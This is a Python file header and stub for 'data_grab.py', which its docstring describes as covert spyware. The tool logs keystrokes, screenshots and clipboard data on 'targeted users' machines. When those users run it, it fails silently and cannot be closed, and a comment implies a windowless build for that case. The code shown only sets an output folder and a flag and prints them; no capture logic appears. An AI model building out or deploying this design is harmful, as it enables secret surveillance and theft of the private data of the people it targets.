""" data_grab.py - A tool that we can run on computers in order to obtain keystrokes, screenshots, and clipboard data.
 If a command line argument is provided, exceptions are handled with print statements and there is a means to exit the
 program.  However, if no command line argument is provided, exceptions are handled silently and there is no way to
 close the program.  It will run in the background until the user logs out, or the program's process id has been killed.
 Last Update:  24 Feb 2025, Noel Saido """

from sys import argv

# Set the location for storing the output; a local folder, UNC path, or share path a with drive letter are all okay
data_store = r"C:\Temp"

# By default, we are assuming that this tool will be run by the targeted users themselves
in_our_hands = False

# If we supply a command line argument, that implies that we are running the tool ourselves on the target systems
# If we plan to use the tool in this manner, ensure we do NOT build using a -w option with PyInstaller
if len(argv) == 2:
    in_our_hands = True
    data_store = argv[1]

print(in_our_hands)
print(data_store)
